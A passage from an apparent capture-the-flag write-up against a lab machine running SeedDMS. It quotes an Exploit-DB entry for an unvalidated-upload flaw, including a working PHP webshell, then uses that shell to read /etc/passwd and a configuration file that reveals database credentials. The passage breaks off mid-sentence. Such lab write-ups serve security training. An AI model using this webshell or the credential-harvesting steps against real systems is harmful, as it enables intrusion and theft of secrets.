/usr/share/exploitdb/exploits/php/webapps/47022.txt</span></span><br><span class="line"><span class="comment"># Exploit Title: [Remote Command Execution through Unvalidated File Upload in SeedDMS versions &lt;5.1.11]</span></span><br><span class="line"><span class="comment"># Google Dork: [NA]</span></span><br><span class="line"><span class="comment"># Date: [20-June-2019]</span></span><br><span class="line"><span class="comment"># Exploit Author: [Nimit Jain](https://www.linkedin.com/in/nimitiitk)(https://secfolks.blogspot.com)</span></span><br><span class="line"><span class="comment"># Vendor Homepage: [https://www.seeddms.org]</span></span><br><span class="line"><span class="comment"># Software Link: [https://sourceforge.net/projects/seeddms/files/]</span></span><br><span class="line"><span class="comment"># Version: [SeedDMS versions &lt;5.1.11] (REQUIRED)</span></span><br><span class="line"><span class="comment"># Tested on: [NA]</span></span><br><span class="line"><span class="comment"># CVE : [CVE-2019-12744]</span></span><br><span class="line"></span><br><span class="line">Exploit Steps:</span><br><span class="line"></span><br><span class="line">Step 1: Login to the application and under any folder add a document.</span><br><span class="line">Step 2: Choose the document as a simple php backdoor file or any backdoor/webshell could be used.</span><br><span class="line"></span><br><span class="line">PHP Backdoor Code: </span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$cmd</span> = (<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">        system(<span class="variable">$cmd</span>);</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">Step 3: Now after uploading the file check the document <span class="built_in">id</span> corresponding to the document.</span><br><span class="line">Step 4: Now go to example.com/data/1048576/<span class="string">&quot;document_id&quot;</span>/1.php?cmd=<span class="built_in">cat</span>+/etc/passwd to get the <span class="built_in">command</span> response <span class="keyword">in</span> browser.</span><br><span class="line"></span><br><span class="line">Note: Here <span class="string">&quot;data&quot;</span> and <span class="string">&quot;1048576&quot;</span> are default folders <span class="built_in">where</span> the uploaded files are getting saved.</span><br></pre></td></tr></table></figure>

<p>We just need to upload webshell on machine and access via from default directory and<br>document ID. The file name will be changed to 1.php. For some reason we webshell which<br>gives reverse connection doesn’t work, so we have to use the above mentioned php code to<br>execute commands.</p>
<p>Save that php code in file and we need to upload it in the “Michelle’s” folder.</p>
<p>It doesn’t really matter what you name the file, it get turned to 1.php. If you look over<br>“download” button the you’d find the document ID, which is required to access the php file.</p>
<p>Note: On machine a clean-up script is running and it deletes the uploaded file after every 5<br>minutes.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">http://dms-pit.htb/seeddms51x/data/1048576/29/1.php?cmd=<span class="built_in">cat</span>%20/etc/passwd</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:5:0:<span class="built_in">sync</span>:/sbin:/bin/sync</span><br><span class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><br><span class="line">operator:x:11:0:operator:/root:/sbin/nologin</span><br><span class="line">games:x:12:100:games:/usr/games:/sbin/nologin</span><br><span class="line">ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin</span><br><span class="line">dbus:x:81:81:System message bus:/:/sbin/nologin</span><br><span class="line">systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin</span><br><span class="line">systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin</span><br><span class="line">tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin</span><br><span class="line">polkitd:x:998:995:User <span class="keyword">for</span> polkitd:/:/sbin/nologin</span><br><span class="line">unbound:x:997:994:Unbound DNS resolver:/etc/unbound:/sbin/nologin</span><br><span class="line">sssd:x:996:992:User <span class="keyword">for</span> sssd:/:/sbin/nologin</span><br><span class="line">chrony:x:995:991::/var/lib/chrony:/sbin/nologin</span><br><span class="line">sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin</span><br><span class="line">michelle:x:1000:1000::/home/michelle:/bin/bash</span><br><span class="line">setroubleshoot:x:994:990::/var/lib/setroubleshoot:/sbin/nologin</span><br><span class="line">cockpit-ws:x:993:989:User <span class="keyword">for</span> cockpit-ws:/nonexisting:/sbin/nologin</span><br><span class="line">mysql:x:27:27:MySQL Server:/var/lib/mysql:/sbin/nologin</span><br><span class="line">nginx:x:992:988:Nginx web server:/var/lib/nginx:/sbin/nologin</span><br><span class="line">apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin</span><br><span class="line">cockpit-wsinstance:x:991:987:User <span class="keyword">for</span> cockpit-ws instances:/nonexisting:/sbin/nologin</span><br><span class="line">rngd:x:990:986:Random Number Generator Daemon:/var/lib/rngd:/sbin/nologin</span><br></pre></td></tr></table></figure>

<p>We got command execution. But, due to some reason we can’t able to get reverse connection<br>on our machine. Let’s search for any stored credentials on target machine.</p>
<p>Initial Access<br>If we visit the configuration directory and access the settings.xml file then we will get MYSQL<br>creds.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://dms-pit.htb/seeddms51x/data/1048576/29/1.php?cmd=<span class="built_in">cat</span>%20../../../conf/settings.xml</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;site&gt;</span><br><span class="line">    &lt;!-- siteName: Name of site used <span class="keyword">in</span> the page titles. Default: SeedDMS</span><br><span class="line">       - footNote: Message to display at the bottom of every page</span><br><span class="line">       - printDisclaimer: <span class="keyword">if</span> <span class="literal">true</span> the disclaimer message the lang.inc files will be <span class="built_in">print</span> on the bottom of the page</span><br><span class="line">       - language: default language (name of a subfolder <span class="keyword">in</span> folder <span class="string">&quot;languages&quot;</span>)</span><br><span class="line">       - theme: default style (name of a subfolder <span class="keyword">in</span> folder <span class="string">&quot;styles&quot;</span>)</span><br><span class="line">    --&gt;</span><br><span class="line">    &lt;display siteName=<span class="string">&quot;SeedDMS&quot;</span> footNote=<span class="string">&quot;SeedDMS free document management system - www.seeddms.org&quot;</span> printDisclaimer=<span class="string">&quot;true&quot;</span> language=<span class="string">&quot;en_GB&quot;</span> theme=<span class="string">&quot;bootstrap&quot;</span> previewWidthList=<span class="string">&quot;40&quot;</span> previewWidthDetail=<span class="string">&quot;100&quot;</span> availablelanguages=<span class="string">&quot;&quot;</span> showFullPreview=<span class="string">&quot;false&quot;</span> convertToPdf=<span class="string">&quot;false&quot;</span> previewWidthMenuList=<span class="string">&quot;40&quot;</span> previewWidthDropFolderList=<span class="string">&quot;100&quot;</span> maxItemsPerPage=<span class="string">&quot;0&quot;</span> incItemsPerPage=<span class="string">&quot;0&quot;</span>&gt;  </span><br><span class="line">    &lt;/display&gt;</span><br><span class="line">    &lt;!-- strictFormCheck: Strict form checking. If <span class="built_in">set</span> to <span class="literal">true</span>, <span class="keyword">then</span> all fields <span class="keyword">in</span> the form will be checked <span class="keyword">for</span> a value. If <span class="built_in">set</span> to <span class="literal">false</span>, <span class="keyword">then</span> (most) comments and keyword fields become optional. Comments are always required when submitting a review or overriding document status.</span><br><span class="line">       - viewOnlineFileTypes: files with one of the following endings can be viewed online (USE ONLY LOWER CASE CHARACTERS)</span><br><span class="line">       - enableConverting: <span class="built_in">enable</span>/disable converting of files</span><br><span class="line">       - enableEmail: <span class="built_in">enable</span>/disable automatic email notification</span><br><span class="line">       - enableUsersView: <span class="built_in">enable</span>/disable group and user view <span class="keyword">for</span> all <span class="built_in">users</span></span><br><span class="line">       - enableFullSearch: <span class="literal">false</span> to don<span class="string">&#x27;t use fulltext search</span></span><br><span class="line"><span class="string">       - enableLanguageSelector: false to don&#x27;</span>t show the language selector after login</span><br><span class="line">       - enableClipboard: <span class="literal">false</span> to hide the clipboard</span><br><span class="line">       - enableFolderTree: <span class="literal">false</span> to don<span class="string">&#x27;t show the folder tree</span></span><br><span class="line"><span class="string">       - expandFolderTree: 0 to start with tree hidden</span></span><br><span class="line"><span class="string">       -                   1 to start with tree shown and first level expanded</span></span><br><span class="line"><span class="string">       -                   2 to start with tree shown fully expanded     </span></span><br><span class="line"><span class="string">       - stopWordsFile: path to stop word file for indexer</span></span><br><span class="line"><span class="string">       - sortUsersInList: how to sort users in lists (&#x27;</span>fullname<span class="string">&#x27; or &#x27;</span><span class="string">&#x27; (default))</span></span><br><span class="line"><span class="string">    --&gt;   </span></span><br><span class="line"><span class="string">    &lt;edition strictFormCheck=&quot;false&quot; viewOnlineFileTypes=&quot;.txt;.text;.html;.htm;.xml;.pdf;.gif;.png;.jpg;.jpeg&quot; enableConverting=&quot;true&quot; enableEmail=&quot;true&quot; enableUsersView=&quot;true&quot; enableFullSearch=&quot;true&quot; enableClipboard=&quot;false&quot; enableFolderTree=&quot;true&quot; expandFolderTree=&quot;1&quot; enableLanguageSelector=&quot;true&quot; stopWordsFile=&quot;&quot; sortUsersInList=&quot;&quot; enableDropUpload=&quot;false&quot; enableRecursiveCount=&quot;false&quot; maxRecursiveCount=&quot;0&quot; enableThemeSelector=&quot;false&quot; fullSearchEngine=&quot;sqlitefts&quot; sortFoldersDefault=&quot;u&quot; editOnlineFileTypes=&quot;&quot; enableMenuTasks=&quot;false&quot; enableHelp=&quot;false&quot; defaultSearchMethod=&quot;database&quot; libraryFolder=&quot;0&quot; maxSizeForFullText=&quot;0&quot; showSingleSearchHit=&quot;false&quot; enableSessionList=&quot;false&quot; enableDropFolderList=&quot;false&quot; enableMultiUpload=&quot;false&quot; defaultDocPosition=&quot;end&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/edition&gt; </span></span><br><span class="line"><span class="string">    &lt;!-- enableCalendar: enable/disable calendar</span></span><br><span class="line"><span class="string">       - calendarDefaultView: calendar default view (&quot;w&quot; for week,&quot;m&quot; for month,&quot;y&quot; for year)</span></span><br><span class="line"><span class="string">       - firstDayOfWeek: first day of the week (0=sunday, 6=saturday)</span></span><br><span class="line"><span class="string">    --&gt;  </span></span><br><span class="line"><span class="string">    &lt;calendar enableCalendar=&quot;true&quot; calendarDefaultView=&quot;y&quot; firstDayOfWeek=&quot;0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/calendar&gt;</span></span><br><span class="line"><span class="string">  &lt;webdav enableWebdavReplaceDoc=&quot;true&quot;/&gt;&lt;/site&gt;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  &lt;system&gt;</span></span><br><span class="line"><span class="string">    &lt;!-- rootDir: Path to where SeedDMS is located</span></span><br><span class="line"><span class="string">       - httpRoot: The relative path in the URL, after the domain part. Do not include the</span></span><br><span class="line"><span class="string">       -           http:// prefix or the web host name. e.g. If the full URL is</span></span><br><span class="line"><span class="string">	     -           http://www.example.com/seeddms/, set $_httpRoot = &quot;/seeddms/&quot;.</span></span><br><span class="line"><span class="string">	     -           If the URL is http://www.example.com/, set $_httpRoot = &quot;/&quot;.</span></span><br><span class="line"><span class="string">       - contentDir: Where the uploaded files are stored (best to choose a directory that</span></span><br><span class="line"><span class="string">       -             is not accessible through your web-server)</span></span><br><span class="line"><span class="string">       - stagingDir: Where partial file uploads are saved</span></span><br><span class="line"><span class="string">       - luceneDir: Where the lucene fulltext index iѕ saved</span></span><br><span class="line"><span class="string">       - logFileEnable: set false to disable log system</span></span><br><span class="line"><span class="string">       - logFileRotation: the log file rotation (h=hourly, d=daily, m=monthly)</span></span><br><span class="line"><span class="string">       - enableLargeFileUpload: support for jumploader</span></span><br><span class="line"><span class="string">       - partitionsize: size of chunk uploaded by jumploader</span></span><br><span class="line"><span class="string">       - dropFolderDir: where files for document upload are located</span></span><br><span class="line"><span class="string">       - cacheDir: where the preview images are saved</span></span><br><span class="line"><span class="string">    --&gt;</span></span><br><span class="line"><span class="string">    &lt;server rootDir=&quot;/var/www/html/seeddms51x/seeddms/&quot; httpRoot=&quot;/seeddms51x/seeddms/&quot; contentDir=&quot;/var/www/html/seeddms51x/data/&quot; stagingDir=&quot;/var/www/html/seeddms51x/data/staging/&quot; luceneDir=&quot;/var/www/html/seeddms51x/data/lucene/&quot; logFileEnable=&quot;true&quot; logFileRotation=&quot;d&quot; enableLargeFileUpload=&quot;false&quot; partitionSize=&quot;2000000&quot; cacheDir=&quot;/var/www/html/seeddms51x/data/cache/&quot; dropFolderDir=&quot;&quot; backupDir=&quot;&quot; repositoryUrl=&quot;&quot; maxUploadSize=&quot;&quot; enableXsendfile=&quot;false&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/server&gt;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    &lt;!-- enableGuestLogin: If you want anybody to login as guest, set the following line to true</span></span><br><span class="line"><span class="string">       -                   note: guest login should be used only in a trusted environment</span></span><br><span class="line"><span class="string">			 - enablePasswordForgotten: Allow users to reset their password</span></span><br><span class="line"><span class="string">       - restricted: Restricted access: only allow users to log in if they have an entry in the local database (irrespective of successful authentication with LDAP).</span></span><br><span class="line"><span class="string">       - enableUserImage: enable users images</span></span><br><span class="line"><span class="string">       - disableSelfEdit: if true user cannot edit his own profile</span></span><br><span class="line"><span class="string">			 - passwordStrength: minimum strength of password, set to 0 to disable</span></span><br><span class="line"><span class="string">			 - passwordExpiration: number of days after password expires</span></span><br><span class="line"><span class="string">			 - passwordHistory: number of remembered passwords</span></span><br><span class="line"><span class="string">			 - passwordStrengthAlgorithm: algorithm used to calculate password strenght (simple or advanced)</span></span><br><span class="line"><span class="string">			 - encryptionKey: arbitrary string used for creating identifiers</span></span><br><span class="line"><span class="string">    --&gt;    </span></span><br><span class="line"><span class="string">    &lt;authentication enableGuestLogin=&quot;false&quot; enablePasswordForgotten=&quot;false&quot; restricted=&quot;true&quot; enableUserImage=&quot;false&quot; disableSelfEdit=&quot;false&quot; passwordStrength=&quot;0&quot; passwordStrengthAlgorithm=&quot;simple&quot; passwordExpiration=&quot;10&quot; passwordHistory=&quot;0&quot; loginFailure=&quot;0&quot; autoLoginUser=&quot;0&quot; quota=&quot;0&quot; undelUserIds=&quot;&quot; encryptionKey=&quot;cfecb42d13f2e1666cddde56991a2cbf&quot; cookieLifetime=&quot;0&quot; enableGuestAutoLogin=&quot;false&quot; defaultAccessDocs=&quot;0&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;connectors&gt;</span></span><br><span class="line"><span class="string">        &lt;!-- ***** CONNECTOR LDAP  *****</span></span><br><span class="line"><span class="string">           - enable: enable/disable connector</span></span><br><span class="line"><span class="string">           - type: type of connector ldap / AD</span></span><br><span class="line"><span class="string">           - host: hostname of the authentification server</span></span><br><span class="line"><span class="string">           -       URIs are supported, e.g.: ldaps://ldap.host.com</span></span><br><span class="line"><span class="string">           - port: port of the authentification server</span></span><br><span class="line"><span class="string">           - baseDN: top level of the LDAP directory tree</span></span><br><span class="line"><span class="string">        --&gt;  </span></span><br><span class="line"><span class="string">        &lt;connector enable=&quot;false&quot; type=&quot;ldap&quot; host=&quot;ldaps://ldap.host.com&quot; port=&quot;389&quot; baseDN=&quot;&quot; bindDN=&quot;&quot; bindPw=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/connector&gt;</span></span><br><span class="line"><span class="string">        &lt;!-- ***** CONNECTOR Microsoft Active Directory  *****</span></span><br><span class="line"><span class="string">           - enable: enable/disable connector</span></span><br><span class="line"><span class="string">           - type: type of connector ldap / AD</span></span><br><span class="line"><span class="string">           - host: hostname of the authentification server</span></span><br><span class="line"><span class="string">           - port: port of the authentification server</span></span><br><span class="line"><span class="string">           - baseDN: top level of the LDAP directory tree</span></span><br><span class="line"><span class="string">           - accountDomainName: sample: example.com</span></span><br><span class="line"><span class="string">        --&gt;  </span></span><br><span class="line"><span class="string">        &lt;connector enable=&quot;false&quot; type=&quot;AD&quot; host=&quot;ldap.example.com&quot; port=&quot;389&quot; baseDN=&quot;&quot; accountDomainName=&quot;example.com&quot; bindDN=&quot;&quot; bindPw=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/connector&gt;</span></span><br><span class="line"><span class="string">      &lt;/connectors&gt;</span></span><br><span class="line"><span class="string">    &lt;/authentication&gt;</span></span><br><span class="line"><span class="string">    &lt;!--</span></span><br><span class="line"><span class="string">       - dbDriver: DB-Driver used by adodb (see adodb-readme)</span></span><br><span class="line"><span class="string">       - dbHostname: DB-Server</span></span><br><span class="line"><span class="string">       - dbDatabase: database where the tables for seeddms are stored (optional - see adodb-readme)</span></span><br><span class="line"><span class="string">       - dbUser: username for database-access</span></span><br><span class="line"><span class="string">       - dbPass: password for database-access</span></span><br><span class="line"><span class="string">    --&gt;    </span></span><br><span class="line"><span class="string">    &lt;database dbDriver=&quot;mysql&quot; dbHostname=&quot;localhost&quot; dbDatabase=&quot;seeddms&quot; dbUser=&quot;seeddms&quot; dbPass=&quot;ied^ieY6xoquu&quot; doNotCheckVersion=&quot;false&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/database&gt;</span></span><br><span class="line"><span class="string">    &lt;!-- smtpServer: SMTP Server hostname</span></span><br><span class="line"><span class="string">       - smtpPort: SMTP Server port</span></span><br><span class="line"><span class="string">       - smtpSendFrom: Send from</span></span><br><span class="line"><span class="string">    --&gt;    </span></span><br><span class="line"><span class="string">    &lt;smtp smtpServer=&quot;localhost&quot; smtpPort=&quot;25&quot; smtpSendFrom=&quot;seeddms@localhost&quot; smtpUser=&quot;&quot; smtpPassword=&quot;&quot;/&gt;    </span></span><br><span class="line"><span class="string">  &lt;/system&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  &lt;advanced&gt;</span></span><br><span class="line"><span class="string">    &lt;!-- siteDefaultPage: Default page on login. Defaults to out/out.ViewFolder.php</span></span><br><span class="line"><span class="string">       - rootFolderID: ID of root-folder (mostly no need to change)</span></span><br><span class="line"><span class="string">       - titleDisplayHack: Workaround for page titles that go over more than 2 lines.</span></span><br><span class="line"><span class="string">    --&gt;  </span></span><br><span class="line"><span class="string">    &lt;display siteDefaultPage=&quot;&quot; rootFolderID=&quot;1&quot; titleDisplayHack=&quot;true&quot; showMissingTranslations=&quot;false&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/display&gt;</span></span><br><span class="line"><span class="string">    &lt;!-- guestID: ID of guest-user used when logged in as guest (mostly no need to change)</span></span><br><span class="line"><span class="string">       - adminIP: if enabled admin can login only by specified IP addres, leave empty to avoid the control</span></span><br><span class="line"><span class="string">       -          NOTE: works only with local autentication (no LDAP)</span></span><br><span class="line"><span class="string">    --&gt; </span></span><br><span class="line"><span class="string">    &lt;authentication guestID=&quot;2&quot; adminIP=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/authentication&gt;</span></span><br><span class="line"><span class="string">    &lt;!-- enableAdminRevApp: false to don&#x27;</span>t list administrator as reviewer/approver</span><br><span class="line">       - versioningFileName: the name of the versioning info file created by the backup tool</span><br><span class="line">       - workflowMode: <span class="string">&#x27;traditional&#x27;</span> or <span class="string">&#x27;advanced&#x27;</span></span><br><span class="line">       - enableVersionDeletion: allow to delete versions after approval</span><br><span class="line">       - enableVersionModification: allow to modify versions after approval</span><br><span class="line">       - enableDuplicateDocNames: allow duplicate names <span class="keyword">in</span> a folder</span><br><span class="line">    --&gt; </span><br><span class="line">    &lt;edition enableAdminRevApp=<span class="string">&quot;false&quot;</span> versioningFileName=<span class="string">&quot;versioning_info.txt&quot;</span> workflowMode=<span class="string">&quot;traditional&quot;</span> enableVersionDeletion=<span class="string">&quot;true&quot;</span> enableVersionModification=<span class="string">&quot;true&quot;</span> enableDuplicateDocNames=<span class="string">&quot;true&quot;</span> enableOwnerRevApp=<span class="string">&quot;false&quot;</span> enableSelfRevApp=<span class="string">&quot;false&quot;</span> presetExpirationDate=<span class="string">&quot;&quot;</span> overrideMimeType=<span class="string">&quot;false&quot;</span> initialDocumentStatus=<span class="string">&quot;0&quot;</span> enableAcknowledgeWorkflow=<span class="string">&quot;&quot;</span> enableRevisionWorkflow=<span class="string">&quot;&quot;</span> advancedAcl=<span class="string">&quot;false&quot;</span> enableUpdateRevApp=<span class="string">&quot;false&quot;</span> removeFromDropFolder=<span class="string">&quot;false&quot;</span> allowReviewerOnly=<span class="string">&quot;false&quot;</span>&gt;</span><br><span class="line">    &lt;/edition&gt;</span><br><span class="line">		&lt;!-- enableNotificationAppRev: <span class="literal">true</span> to send notifation <span class="keyword">if</span> a user is added as a reviewer or approver</span><br><span class="line">		--&gt;</span><br><span class="line">    &lt;notification enableNotificationAppRev=<span class="string">&quot;true&quot;</span> enableOwnerNotification=<span class="string">&quot;false&quot;</span> enableNotificationWorkflow=<span class="string">&quot;false&quot;</span>&gt;</span><br><span class="line">    &lt;/notification&gt;</span><br><span class="line">    &lt;!-- coreDir: Path to SeedDMS_Core (optional)</span><br><span class="line">       - luceneClassDir: Path to SeedDMS_Lucene (optional)</span><br><span class="line">       - contentOffsetDir: To work around limitations <span class="keyword">in</span> the underlying file system, a new </span><br><span class="line">       -                   directory structure has been devised that exists within the content </span><br><span class="line">       -                   directory (<span class="variable">$_contentDir</span>). This requires a base directory from <span class="built_in">which</span> </span><br><span class="line">       -                   to begin. Usually leave this to the default setting, 1048576, but can </span><br><span class="line">       -                   be any number or string that does not already exist within <span class="variable">$_contentDir</span>.	</span><br><span class="line">       - maxDirID: Maximum number of sub-directories per parent directory. Default: 0, use 31998 (maximum number of <span class="built_in">dirs</span> <span class="keyword">in</span> ext3) <span class="keyword">for</span> a multi level content directory.</span><br><span class="line">       - updateNotifyTime: <span class="built_in">users</span> are notified about document-changes that took place within the last <span class="string">&quot;updateNotifyTime&quot;</span> seconds</span><br><span class="line">       - extraPath: Path to addtional software. This is the directory containing additional software like the adodb directory, or the pear Log package. This path will be added to the php include path</span><br><span class="line">    --&gt;</span><br><span class="line">    &lt;server coreDir=<span class="string">&quot;&quot;</span> luceneClassDir=<span class="string">&quot;&quot;</span> contentOffsetDir=<span class="string">&quot;1048576&quot;</span> maxDirID=<span class="string">&quot;0&quot;</span> updateNotifyTime=<span class="string">&quot;86400&quot;</span> extraPath=<span class="string">&quot;/var/www/html/seeddms51x/pear/&quot;</span> maxExecutionTime=<span class="string">&quot;30&quot;</span> cmdTimeout=<span class="string">&quot;10&quot;</span>&gt;</span><br><span class="line">    &lt;/server&gt;</span><br><span class="line">    &lt;converters target=<span class="string">&quot;fulltext&quot;</span>&gt;</span><br><span class="line">		 &lt;converter mimeType=<span class="string">&quot;application/pdf&quot;</span>&gt;pdftotext -nopgbrk %s - | sed -e <span class="string">&#x27;s/ [a-zA-Z0-9.]\&#123;1\&#125; / /g&#x27;</span> -e <span class="string">&#x27;s/[0-9.]//g&#x27;</span>&lt;/converter&gt;</span><br><span class="line">     &lt;converter mimeType=<span class="string">&quot;application/msword&quot;</span>&gt;catdoc %s&lt;/converter&gt;</span><br><span class="line">     &lt;converter mimeType=<span class="string">&quot;application/vnd.ms-excel&quot;</span>&gt;ssconvert -T Gnumeric_stf:stf_csv -S %s fd://1&lt;/converter&gt;</span><br><span class="line">     &lt;converter mimeType=<span class="string">&quot;audio/mp3&quot;</span>&gt;id3 -l -R %s | egrep <span class="string">&#x27;(Title|Artist|Album)&#x27;</span> | sed <span class="string">&#x27;s/^[^:]*: //g&#x27;</span>&lt;/converter&gt;</span><br><span class="line">     &lt;converter mimeType=<span class="string">&quot;audio/mpeg&quot;</span>&gt;id3 -l -R %s | egrep <span class="string">&#x27;(Title|Artist|Album)&#x27;</span> | sed <span class="string">&#x27;s/^[^:]*: //g&#x27;</span>&lt;/converter&gt;</span><br><span class="line">     &lt;converter mimeType=<span class="string">&quot;text/plain&quot;</span>&gt;<span class="built_in">cat</span> %s&lt;/converter&gt;</span><br><span class="line">    &lt;/converters&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/advanced&gt;</span><br><span class="line"></span><br><span class="line">&lt;extensions&gt;&lt;extension name=<span class="string">&quot;example&quot;</span>/&gt;&lt;/extensions&gt;&lt;/configuration&gt;</span><br><span class="line">&lt;/pre&gt;</span><br></pre></td></tr></table></figure>

<p>the password is:</p>
